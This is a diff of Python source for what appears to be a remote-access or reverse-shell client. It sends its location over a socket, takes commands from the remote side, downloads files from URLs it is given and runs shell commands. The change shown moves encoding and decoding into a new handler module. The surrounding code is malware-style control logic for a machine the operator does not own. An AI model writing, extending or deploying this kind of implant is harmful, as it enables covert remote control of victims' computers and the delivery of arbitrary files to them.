@@ -16,6 +16,7 @@ from subprocess import *
 import command
 import constant
 import downloader
+import handler
 import logger
 import screenshot
 
@@ -57,14 +58,14 @@ def main():
         while True:
             # Send the path.
             path = os.path.dirname(os.path.abspath(__file__))
-            s.sendall(path.encode(constant.ENCODE_TYPE))
+            s.sendall(handler.encode(path))
 
             # Receive it.
             data = s.recv(constant.BUF_SIZE)
             if not data:
                 break
 
-            full_cmd = data.decode(constant.DECODE_TYPE)
+            full_cmd = handler.decode(data)
             data_str = str(data)
             logger.info(f"Received: {data_str}");
 
@@ -83,7 +84,7 @@ def main():
                     logger.error(f"'{full_cmd}' is not recognized internal command.")
 
 
-            output = "** Default output command... **".encode(constant.ENCODE_TYPE)
+            output = handler.encode("** Default output command... **")
 
             # Check internal command.
             if iic:
@@ -98,7 +99,7 @@ def main():
                     if params_len >= 1:
                         url = params[0]
                         downloader.download(url)
-                        output = "Done downloading the file!".encode(constant.ENCODE_TYPE)
+                        output = handler.encode("Done downloading the file!")
             # Check regular shell command.
             else:
                 if "cd" in full_cmd:
